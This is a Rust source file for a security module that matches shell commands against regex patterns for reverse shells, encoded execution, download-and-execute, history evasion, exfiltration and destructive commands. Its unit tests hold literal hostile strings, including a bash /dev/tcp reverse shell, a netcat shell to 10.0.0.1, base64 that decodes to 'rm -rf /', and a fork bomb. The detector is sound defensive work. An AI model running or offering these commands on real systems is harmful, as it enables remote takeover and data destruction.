//! Threat pattern detection
//!
//! Detects malicious command patterns including:
//! - Reverse shells (bash, nc, python, perl, ruby, php)
//! - Encoded command execution (base64, hex)
//! - Download and execute patterns
//! - History evasion techniques
//! - Data exfiltration patterns

use super::RiskLevel;
use crate::{SecurityError, SecurityResult};
use regex::Regex;
use serde::{Deserialize, Serialize};

/// A threat detection pattern
#[derive(Debug, Clone)]
pub struct ThreatPattern {
    /// Pattern name
    pub name: String,

    /// Pattern description
    pub description: String,

    /// Compiled regex pattern
    pub regex: Regex,

    /// Risk level if matched
    pub risk_level: RiskLevel,

    /// Threat category
    pub category: ThreatCategory,

    /// Whether this pattern should block execution
    pub should_block: bool,
}

impl ThreatPattern {
    /// Create a new threat pattern
    pub fn new(
        name: &str,
        description: &str,
        pattern: &str,
        risk_level: RiskLevel,
        category: ThreatCategory,
        should_block: bool,
    ) -> SecurityResult<Self> {
        let regex = Regex::new(pattern)
            .map_err(|e| SecurityError::PatternError(format!("{}: {}", name, e)))?;

        Ok(Self {
            name: name.to_string(),
            description: description.to_string(),
            regex,
            risk_level,
            category,
            should_block,
        })
    }
}

/// Threat category
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ThreatCategory {
    ReverseShell,
    EncodedExecution,
    DownloadExecute,
    HistoryEvasion,
    DataExfiltration,
    SystemDestruction,
    PrivilegeAbuse,
    Reconnaissance,
    Other,
}

impl ThreatCategory {
    /// Get display name
    pub fn name(&self) -> &'static str {
        match self {
            Self::ReverseShell => "Reverse Shell",
            Self::EncodedExecution => "Encoded Execution",
            Self::DownloadExecute => "Download & Execute",
            Self::HistoryEvasion => "History Evasion",
            Self::DataExfiltration => "Data Exfiltration",
            Self::SystemDestruction => "System Destruction",
            Self::PrivilegeAbuse => "Privilege Abuse",
            Self::Reconnaissance => "Reconnaissance",
            Self::Other => "Suspicious Activity",
        }
    }

    /// Get icon
    pub fn icon(&self) -> &'static str {
        match self {
            Self::ReverseShell => "🐚",
            Self::EncodedExecution => "🔢",
            Self::DownloadExecute => "⬇️",
            Self::HistoryEvasion => "🕵️",
            Self::DataExfiltration => "📤",
            Self::SystemDestruction => "💣",
            Self::PrivilegeAbuse => "👑",
            Self::Reconnaissance => "🔍",
            Self::Other => "⚠️",
        }
    }
}

/// A detected threat match
#[derive(Debug, Clone)]
pub struct ThreatMatch {
    /// Pattern that matched
    pub pattern_name: String,

    /// Pattern description
    pub description: String,

    /// Matched text
    pub matched_text: String,

    /// Position in input
    pub position: (usize, usize),

    /// Risk level
    pub risk_level: RiskLevel,

    /// Threat category
    pub category: ThreatCategory,

    /// Whether execution should be blocked
    pub should_block: bool,

    /// Explanation of why this is dangerous
    pub explanation: String,
}

/// Threat pattern matcher
pub struct ThreatPatternMatcher {
    patterns: Vec<ThreatPattern>,
}

impl ThreatPatternMatcher {
    /// Create a new matcher with default patterns
    pub fn new() -> Self {
        Self {
            patterns: default_patterns(),
        }
    }

    /// Add a custom pattern
    pub fn add_pattern(&mut self, pattern: ThreatPattern) -> SecurityResult<()> {
        self.patterns.push(pattern);
        Ok(())
    }

    /// Find all threats in input
    pub fn find_all(&self, input: &str) -> Vec<ThreatMatch> {
        let mut matches = Vec::new();

        for pattern in &self.patterns {
            for capture in pattern.regex.find_iter(input) {
                matches.push(ThreatMatch {
                    pattern_name: pattern.name.clone(),
                    description: pattern.description.clone(),
                    matched_text: capture.as_str().to_string(),
                    position: (capture.start(), capture.end()),
                    risk_level: pattern.risk_level,
                    category: pattern.category,
                    should_block: pattern.should_block,
                    explanation: get_explanation(pattern.category),
                });
            }
        }

        matches
    }

    /// Check if input contains any blocking threats
    pub fn should_block(&self, input: &str) -> Option<ThreatMatch> {
        self.find_all(input).into_iter().find(|m| m.should_block)
    }

    /// Check if input contains any threats
    pub fn contains_threats(&self, input: &str) -> bool {
        self.patterns.iter().any(|p| p.regex.is_match(input))
    }
}

impl Default for ThreatPatternMatcher {
    fn default() -> Self {
        Self::new()
    }
}

/// Get explanation for a threat category
fn get_explanation(category: ThreatCategory) -> String {
    match category {
        ThreatCategory::ReverseShell => {
            "This command pattern is commonly used to establish a reverse shell connection, \
             allowing an attacker to remotely control your system."
        }
        ThreatCategory::EncodedExecution => {
            "This command decodes and executes hidden content, which is a common technique \
             to bypass security controls and hide malicious payloads."
        }
        ThreatCategory::DownloadExecute => {
            "This command downloads and immediately executes remote content without inspection. \
             This is risky as the content could be malicious."
        }
        ThreatCategory::HistoryEvasion => {
            "This command attempts to hide activity from shell history, which is suspicious \
             behavior often used to cover tracks after an attack."
        }
        ThreatCategory::DataExfiltration => {
            "This command pattern suggests data is being collected and sent to an external \
             destination, which could indicate data theft."
        }
        ThreatCategory::SystemDestruction => {
            "This command could cause irreversible damage to your system by deleting \
             critical files or data."
        }
        ThreatCategory::PrivilegeAbuse => {
            "This command uses elevated privileges in a potentially dangerous way."
        }
        ThreatCategory::Reconnaissance => {
            "This command is gathering system information, which is often a precursor \
             to further attack."
        }
        ThreatCategory::Other => "This command matches a known suspicious pattern.",
    }
    .to_string()
}

/// Default threat patterns
fn default_patterns() -> Vec<ThreatPattern> {
    let mut patterns = Vec::new();

    // ============================================================
    // REVERSE SHELLS
    // ============================================================

    // Bash reverse shell
    if let Ok(p) = ThreatPattern::new(
        "bash_reverse_shell",
        "Bash reverse shell",
        r"bash\s+-i\s+>&\s*/dev/tcp/",
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Alternative bash reverse shell
    if let Ok(p) = ThreatPattern::new(
        "bash_reverse_shell_alt",
        "Bash reverse shell (alternative)",
        r#"bash\s+-c\s+['"].*?/dev/tcp/"#,
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Netcat reverse shell
    if let Ok(p) = ThreatPattern::new(
        "nc_reverse_shell",
        "Netcat reverse shell",
        r"(?:nc|netcat|ncat)\s+(?:-[a-z]+\s+)*-e\s+(?:/bin/(?:ba)?sh|/bin/zsh|cmd)",
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Netcat with mkfifo (named pipe shell)
    if let Ok(p) = ThreatPattern::new(
        "nc_mkfifo_shell",
        "Netcat reverse shell with named pipe",
        r"mkfifo\s+\S+\s*;\s*(?:nc|netcat)",
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Python reverse shell
    if let Ok(p) = ThreatPattern::new(
        "python_reverse_shell",
        "Python reverse shell",
        r#"python[23]?\s+-c\s+['"].*?socket.*?connect.*?(?:subprocess|os\.dup2|pty\.spawn)"#,
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Perl reverse shell
    if let Ok(p) = ThreatPattern::new(
        "perl_reverse_shell",
        "Perl reverse shell",
        r#"perl\s+-e\s+['"].*?socket.*?(?:open|exec).*?/bin/(?:ba)?sh"#,
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Ruby reverse shell
    if let Ok(p) = ThreatPattern::new(
        "ruby_reverse_shell",
        "Ruby reverse shell",
        r#"ruby\s+-rsocket\s+-e\s+['"].*?TCPSocket"#,
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // PHP reverse shell
    if let Ok(p) = ThreatPattern::new(
        "php_reverse_shell",
        "PHP reverse shell",
        r#"php\s+-r\s+['"].*?fsockopen.*?(?:shell_exec|exec|system)"#,
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // Socat reverse shell
    if let Ok(p) = ThreatPattern::new(
        "socat_reverse_shell",
        "Socat reverse shell",
        r"socat\s+.*?EXEC.*?(?:/bin/(?:ba)?sh|/bin/zsh)",
        RiskLevel::Critical,
        ThreatCategory::ReverseShell,
        true,
    ) {
        patterns.push(p);
    }

    // ============================================================
    // ENCODED EXECUTION
    // ============================================================

    // Base64 decode and execute
    if let Ok(p) = ThreatPattern::new(
        "base64_exec",
        "Base64 decode and execute",
        r"(?:base64\s+-d|echo\s+[A-Za-z0-9+/=]+\s*\|\s*base64\s+-d)\s*\|\s*(?:ba)?sh",
        RiskLevel::Critical,
        ThreatCategory::EncodedExecution,
        true,
    ) {
        patterns.push(p);
    }

    // Hex decode and execute
    if let Ok(p) = ThreatPattern::new(
        "hex_exec",
        "Hex decode and execute",
        r"xxd\s+-r(?:\s+-p)?\s*\|\s*(?:ba)?sh",
        RiskLevel::Critical,
        ThreatCategory::EncodedExecution,
        true,
    ) {
        patterns.push(p);
    }

    // Python base64 decode and execute
    if let Ok(p) = ThreatPattern::new(
        "python_b64_exec",
        "Python base64 decode and execute",
        r#"python[23]?\s+-c\s+['"]import\s+base64.*?exec\(base64\.b64decode"#,
        RiskLevel::Critical,
        ThreatCategory::EncodedExecution,
        true,
    ) {
        patterns.push(p);
    }

    // Eval with encoded content
    if let Ok(p) = ThreatPattern::new(
        "eval_encoded",
        "Eval with encoded content",
        r"eval\s+\$\([^)]*(?:base64|xxd|decode)",
        RiskLevel::High,
        ThreatCategory::EncodedExecution,
        true,
    ) {
        patterns.push(p);
    }

    // ============================================================
    // DOWNLOAD AND EXECUTE
    // ============================================================

    // Curl pipe to shell
    if let Ok(p) = ThreatPattern::new(
        "curl_pipe_shell",
        "Download and execute via curl",
        r"curl\s+(?:-[a-zA-Z]+\s+)*(?:https?://|ftp://)\S+\s*\|\s*(?:sudo\s+)?(?:ba)?sh",
        RiskLevel::High,
        ThreatCategory::DownloadExecute,
        false, // Warning, not block - too common in legitimate use
    ) {
        patterns.push(p);
    }

    // Wget pipe to shell
    if let Ok(p) = ThreatPattern::new(
        "wget_pipe_shell",
        "Download and execute via wget",
        r"wget\s+(?:-[a-zA-Z]+\s+)*-O\s*-\s+\S+\s*\|\s*(?:sudo\s+)?(?:ba)?sh",
        RiskLevel::High,
        ThreatCategory::DownloadExecute,
        false,
    ) {
        patterns.push(p);
    }

    // Fetch and execute (BSD)
    if let Ok(p) = ThreatPattern::new(
        "fetch_exec",
        "Fetch and execute (BSD)",
        r"fetch\s+-o\s*-\s+\S+\s*\|\s*(?:ba)?sh",
        RiskLevel::High,
        ThreatCategory::DownloadExecute,
        false,
    ) {
        patterns.push(p);
    }

    // ============================================================
    // HISTORY EVASION
    // ============================================================

    // Unset HISTFILE
    if let Ok(p) = ThreatPattern::new(
        "unset_histfile",
        "Unset history file",
        r"(?:unset|export)\s+HISTFILE(?:=|$|\s|;)",
        RiskLevel::Medium,
        ThreatCategory::HistoryEvasion,
        false,
    ) {
        patterns.push(p);
    }

    // Set HISTSIZE to 0
    if let Ok(p) = ThreatPattern::new(
        "histsize_zero",
        "Set history size to zero",
        r"(?:export\s+)?HISTSIZE=0",
        RiskLevel::Medium,
        ThreatCategory::HistoryEvasion,
        false,
    ) {
        patterns.push(p);
    }

    // History clear
    if let Ok(p) = ThreatPattern::new(
        "history_clear",
        "Clear command history",
        r"history\s+-c|\s*>\s*~/\.(?:bash_history|zsh_history)",
        RiskLevel::Medium,
        ThreatCategory::HistoryEvasion,
        false,
    ) {
        patterns.push(p);
    }

    // Leading space (bash HISTCONTROL)
    // This is too noisy, skipping

    // ============================================================
    // DATA EXFILTRATION
    // ============================================================

    // Tar and send
    if let Ok(p) = ThreatPattern::new(
        "tar_exfil",
        "Archive and exfiltrate data",
        r"tar\s+(?:-[a-zA-Z]+\s+)*\S+\s*\|\s*(?:curl|wget|nc|netcat)",
        RiskLevel::High,
        ThreatCategory::DataExfiltration,
        false,
    ) {
        patterns.push(p);
    }

    // Cat sensitive files to network
    if let Ok(p) = ThreatPattern::new(
        "cat_to_net",
        "Send file contents over network",
        r"cat\s+\S*(?:password|shadow|key|secret|\.ssh)\S*\s*\|\s*(?:curl|wget|nc)",
        RiskLevel::Critical,
        ThreatCategory::DataExfiltration,
        true,
    ) {
        patterns.push(p);
    }

    // ============================================================
    // SYSTEM DESTRUCTION
    // ============================================================

    // Fork bomb
    if let Ok(p) = ThreatPattern::new(
        "fork_bomb",
        "Fork bomb",
        r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
        RiskLevel::Critical,
        ThreatCategory::SystemDestruction,
        true,
    ) {
        patterns.push(p);
    }

    // Delete root filesystem
    if let Ok(p) = ThreatPattern::new(
        "rm_root",
        "Delete root filesystem",
        r"rm\s+(?:-[a-zA-Z]*f[a-zA-Z]*\s+)*(?:-[a-zA-Z]*r[a-zA-Z]*\s+)*(?:/\s*$|/\*\s*$|--no-preserve-root)",
        RiskLevel::Critical,
        ThreatCategory::SystemDestruction,
        true,
    ) {
        patterns.push(p);
    }

    // DD to disk device
    if let Ok(p) = ThreatPattern::new(
        "dd_disk",
        "Direct disk write",
        r"dd\s+.*?of=/dev/(?:sd[a-z]|nvme\d+n\d+|hd[a-z]|vd[a-z])(?:\s|$)",
        RiskLevel::Critical,
        ThreatCategory::SystemDestruction,
        true,
    ) {
        patterns.push(p);
    }

    patterns
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bash_reverse_shell() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::ReverseShell);
        assert!(threats[0].should_block);
    }

    #[test]
    fn test_nc_reverse_shell() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all("nc -e /bin/sh 10.0.0.1 4444");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::ReverseShell);
    }

    #[test]
    fn test_base64_exec() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all("echo 'cm0gLXJmIC8=' | base64 -d | sh");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::EncodedExecution);
    }

    #[test]
    fn test_curl_pipe_shell() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all("curl https://example.com/script.sh | bash");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::DownloadExecute);
        // Should warn but not block (common legitimate use)
        assert!(!threats[0].should_block);
    }

    #[test]
    fn test_history_evasion() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all("unset HISTFILE");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::HistoryEvasion);
    }

    #[test]
    fn test_fork_bomb() {
        let matcher = ThreatPatternMatcher::new();
        let threats = matcher.find_all(":() { : | : & } ; :");
        assert!(!threats.is_empty());
        assert_eq!(threats[0].category, ThreatCategory::SystemDestruction);
        assert!(threats[0].should_block);
    }

    #[test]
    fn test_no_false_positives() {
        let matcher = ThreatPatternMatcher::new();

        // Normal commands should not trigger
        let threats = matcher.find_all("ls -la");
        assert!(threats.is_empty());

        let threats = matcher.find_all("git push origin main");
        assert!(threats.is_empty());

        let threats = matcher.find_all("docker run nginx");
        assert!(threats.is_empty());

        // Base64 without execution should be fine
        let threats = matcher.find_all("echo 'hello' | base64");
        assert!(threats.is_empty());
    }
}
